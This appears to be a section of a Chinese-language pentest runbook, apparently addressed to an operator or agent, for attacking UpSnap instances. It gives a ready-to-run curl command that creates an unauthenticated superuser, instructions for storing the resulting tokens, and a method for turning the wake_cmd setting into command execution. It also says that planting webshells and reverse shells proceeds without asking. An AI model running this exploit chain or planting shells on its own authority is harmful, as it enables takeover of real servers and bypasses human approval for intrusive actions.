## 2. L2 验证（授权内）

**仅当目标明确在 scope，且用户未说暂停。**

### 2.1 未认证建超管（49819，仅「尚无超管」实例）

```bash
EMAIL="se_probe_$(date +%s)@example.invalid"
PASS='SeProbe!2026-A'

curl -sk -X POST "https://授权站/api/upsnap/init-superuser" \
  -H 'Content-Type: application/json' \
  -d "{\"email\":\"${EMAIL}\",\"password\":\"${PASS}\"}" \
  -o /tmp/upsnap_init.json -w '%{http_code}\n'

# 期望：2xx + token / record；若提示已有超管 → 记 STATUS，转弱口/已知账
python3 -c "import json;d=json.load(open('/tmp/upsnap_init.json'));print({k:d.get(k) for k in list(d)[:8]})"
```

JWT / cookie 写入：`案卷/<案卷>/接管/upsnap_token.txt`（勿同步公开仓）。

### 2.2 wake_cmd → 命令执行（验证用无害命令）

用超管会话改设备/唤醒命令为可观测无害命令（如 `id` / `hostname`），触发 wake，对照响应或侧信道。  
授权内写马/反弹直接做。改原超管密、覆盖生产配置先问。

49481：已有合法会话时直接测注入面，跳过 init-superuser。
